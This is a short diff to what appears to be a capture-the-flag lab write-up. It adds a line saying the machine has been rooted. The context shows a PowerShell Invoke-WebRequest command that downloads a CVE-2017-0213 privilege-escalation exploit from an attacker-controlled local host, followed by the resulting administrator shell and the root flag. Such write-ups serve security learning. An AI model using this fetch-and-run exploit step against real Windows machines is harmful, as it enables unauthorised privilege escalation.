@@ -55,3 +55,5 @@ Invoke-WebRequest -Uri http://10.6.30.236:8000/CVE-2017-0213_x64.exe -Outfile CV
 This gave an administrators shell and I was able to find the last flag in C:\Users\Administrator\Desktop
 
 root: 7958b565d7bd88d10c6f22d1c4063
+
+Machine has been rooted action is no longer required.
